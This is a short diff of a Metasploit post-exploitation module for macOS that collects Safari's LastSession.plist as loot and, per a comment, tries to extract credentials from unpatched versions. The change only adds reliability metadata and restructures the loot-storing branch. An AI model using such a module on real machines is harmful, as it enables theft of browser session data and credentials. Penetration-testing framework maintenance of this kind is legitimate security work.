@@ -30,7 +30,12 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => [ 'meterpreter', 'shell' ],
         'References' => [
           ['URL', 'http://www.securelist.com/en/blog/8168/Loophole_in_Safari']
-        ]
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -173,10 +178,10 @@ class MetasploitModule < Msf::Post
     if lastsession.blank?
       print_error("#{peer} - LastSession.plist not found")
       return
-    else
-      p = store_loot('osx.lastsession.plist', 'text/plain', session, lastsession, 'LastSession.plist.xml')
-      print_good("#{peer} - LastSession.plist stored in: #{p}")
     end
+
+    p = store_loot('osx.lastsession.plist', 'text/plain', session, lastsession, 'LastSession.plist.xml')
+    print_good("#{peer} - LastSession.plist stored in: #{p}")
 
 #
 # If this is an unpatched version, we try to extract creds
